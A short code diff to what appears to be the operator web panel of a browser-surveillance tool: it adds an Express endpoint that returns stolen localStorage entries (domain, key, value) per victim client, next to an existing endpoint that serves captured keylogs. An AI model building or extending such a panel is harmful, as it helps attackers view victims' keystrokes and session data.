@@ -98,6 +98,16 @@ module.exports = function initializeWebUiApi(appWebUI, server) {
     const keylogs = stmt.all(client_id);
     res.json(keylogs);
   });
+  appWebUI.get("/localstorage/:client_id", (req, res) => {
+    const { client_id } = req.params;
+    const stmt = db.prepare(
+      `
+      SELECT domain,key,value FROM localstorage WHERE client_id = ?
+      `
+    );
+    const localstorage = stmt.all(client_id);
+    res.json(localstorage);
+  });
   appWebUI.get("/clients", (req, res) => {
     const stmt = db.prepare(`
       SELECT 
